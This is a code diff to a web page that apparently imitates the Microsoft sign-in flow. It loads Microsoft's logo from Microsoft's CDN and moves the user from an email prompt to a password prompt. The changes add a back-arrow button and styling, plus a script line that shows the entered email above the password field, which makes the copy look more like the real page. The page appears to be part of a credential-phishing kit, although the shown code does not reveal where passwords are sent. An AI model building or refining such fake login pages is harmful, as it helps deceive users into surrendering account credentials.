@@ -134,6 +134,36 @@ span.psw {
   cursor: pointer;
 }
 
+.passwordmodalemail{
+    display: flex;
+    
+}
+
+.passwordmodalemail p{
+    margin: 0px;
+}
+
+.passwordmodalemail button :hover{
+    height:auto;
+    width:auto;
+    margin:0px;
+    margin-right:5px;
+    border-radius:40px;
+    padding: 0px; 
+    background-color: rgba(0,0,0,.2);
+}
+
+.passwordmodalemail button {
+    height:auto;
+    width:auto;
+    margin:0px;
+    border-radius:40px;
+    padding: 0px; 
+    background-color: transparent;
+}
+
+
+
 /* Add Zoom Animation */
 .animate {
   -webkit-animation: animatezoom 0.6s;
@@ -203,6 +233,12 @@ span.psw {
       
             <img src="https://logincdn.msauth.net/16.000.28345.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt=""> 
             <br><br>
+            <div class="passwordmodalemail">
+            <button><img src="https://logincdn.msauth.net/16.000.28345.6/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" alt=""></button>
+            <p id="emailaddress"></p>
+            </div>
+           <br>
+
             <label class="signintxt" for="uname">Enter password</label> <br><br>
             <input class="password" type="text" placeholder="Password" name="uname" required>
       
@@ -229,6 +265,7 @@ passmodal.style.display = "none";
 function nextBtn(){
    event.preventDefault();
     var email = document.getElementById("loginEmail").value;
+    document.getElementById("emailaddress").innerText = email
     if(email != "" ){
     modal.style.display = "none";
     passmodal.style.display = "block";
